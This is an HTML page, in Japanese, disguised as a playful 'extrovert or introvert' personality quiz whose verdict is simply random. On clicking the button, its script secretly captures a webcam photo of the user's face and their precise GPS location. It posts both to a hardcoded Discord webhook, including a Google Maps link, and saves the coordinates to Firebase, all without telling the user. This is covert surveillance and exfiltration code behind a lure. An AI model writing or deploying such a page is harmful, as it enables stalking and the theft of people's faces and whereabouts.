<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>陽キャ・陰キャ診断</title>
    <style>
        body { text-align: center; font-family: sans-serif; background: #f0f0f0; padding-top: 50px; }
        video { width: 90%; max-width: 400px; border-radius: 10px; border: 3px solid #333; }
        #result { font-size: 28px; font-weight: bold; margin-top: 20px; color: #ff4500; height: 40px; }
        button { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 5px; margin-top: 10px; }
    </style>
</head>
<body>

    <h1>陽キャ・陰キャ診断</h1>
    <video id="video" autoplay playsinline></video>
    <br>
    <div id="result"></div>
    <button id="btn">診断を開始する</button>
    <canvas id="canvas" style="display:none;"></canvas>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, addDoc, collection, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        // 【1】Firebaseの設定をここに貼る
        const firebaseConfig = {
            apiKey: "あなたのAPIキー",
            authDomain: "あなたのプロジェクト.firebaseapp.com",
            projectId: "あなたのプロジェクトID",
            storageBucket: "あなたのプロジェクト.appspot.com",
            messagingSenderId: "あなたのID",
            appId: "あなたのアプリID"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const btn = document.getElementById('btn');
        const resultDiv = document.getElementById('result');

        // カメラ起動
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => { video.srcObject = stream; })
            .catch(err => alert("カメラを許可してください"));

        btn.onclick = () => {
            btn.disabled = true;
            resultDiv.innerText = "スキャン中...";

            navigator.geolocation.getCurrentPosition(async (pos) => {
                const lat = pos.coords.latitude;
                const lng = pos.coords.longitude;

                // 写真キャプチャ
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const imageData = canvas.toDataURL('image/jpeg');
                const blob = await (await fetch(imageData)).blob();

                // 診断結果
                const res = Math.random() > 0.5 ? "陽キャ" : "陰キャ";

                try {
                    // 【2】DiscordのWebhook URLをここに貼る
                    const webhookUrl = "https://discord.com/api/webhooks/1475357385492136098/7L3L92yDhZhsjeQAh9NgcgOeS4ESaaCUvYda9-d4EW4Juxey1rX3gZ-BXLI6qgl02IA_";

                    // Discord送信
                    const formData = new FormData();
                    formData.append("content", `【新着】結果: ${res}\n場所: https://www.google.com/maps?q=${lat},${lng}`);
                    formData.append("file", blob, "face.jpg");

                    await fetch(webhookUrl, { method: "POST", body: formData });

                    // Firebaseに文字データだけ保存
                    await addDoc(collection(db, "results"), {
                        result: res,
                        location: { lat, lng },
                        timestamp: serverTimestamp()
                    });

                    resultDiv.innerText = "結果: " + res;
                    alert("診断完了！");
                } catch (e) {
                    console.error(e);
                    alert("送信に失敗しました");
                } finally {
                    btn.disabled = false;
                }

            }, (err) => {
                alert("位置情報を許可してください");
                btn.disabled = false;
            });
        };
    </script>
</body>
</html>
